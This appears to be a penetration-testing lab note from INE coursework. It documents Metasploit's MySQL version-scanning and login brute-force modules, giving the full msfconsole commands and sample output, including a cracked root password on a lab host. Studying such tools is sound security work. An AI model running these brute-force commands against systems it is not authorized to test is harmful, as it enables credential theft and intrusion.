# 🐬 Metasploit - MySQL Enumeration

This file documents several **Metasploit auxiliary modules** used for **MySQL service enumeration**.  
Each module has a different purpose, such as version detection, login brute forcing, and user/database enumeration.

---

## 🎯 Purpose

The Metasploit **MySQL enumeration modules** help penetration testers to:
- Detect the exact version of the MySQL server
- Identify valid login credentials through brute force
- Enumerate users, databases, and privileges
- Collect information useful for further exploitation

---

## 🛠️ Module Used

```
auxiliary/scanner/mysql/mysql_version
```

---

## 💡 How to Use It

```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS <target-ip or hostname>
run
```

✅ **Example (INE Lab)**

```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

**Output:**
```
[+] 192.162.117.3:3306 - 192.162.117.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

## 📝 Notes
- Default MySQL port: **3306**
- Useful for version-based vulnerability research
- Some servers may hide banner/version for security reasons

---

## 🔑 Metasploit - MySQL Login Enumeration

This module attempts to **bruteforce MySQL login credentials**.

---

### 🎯 Purpose
The `mysql_login` auxiliary module helps you:
- Test username and password combinations against a MySQL server
- Find valid login credentials for further exploitation
- Automate brute force attacks using wordlists

---

### 🛠️ Module Used

```
auxiliary/scanner/mysql/mysql_login
```

---

### 💡 How to Use It

```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-ip or hostname>
set USERNAME <username>
set PASS_FILE <path-to-password-list>
set VERBOSE false
run
```

✅ **Example (INE Lab)**

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

**Output:**
```
[+] 192.162.117.3:3306    - 192.162.117.3:3306 - Success: 'root:twinkle'
[*] demo.ine.local:3306   - Scanned 1 of 1 hosts (100% complete)
[*] demo.ine.local:3306   - Bruteforce completed, 1 credential was successful.
[*] demo.ine.local:3306   - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

---

### 📝 Notes
- Useful for **brute-forcing MySQL accounts**
- Default username often tested: **root**
- Pair with strong password wordlists for better results
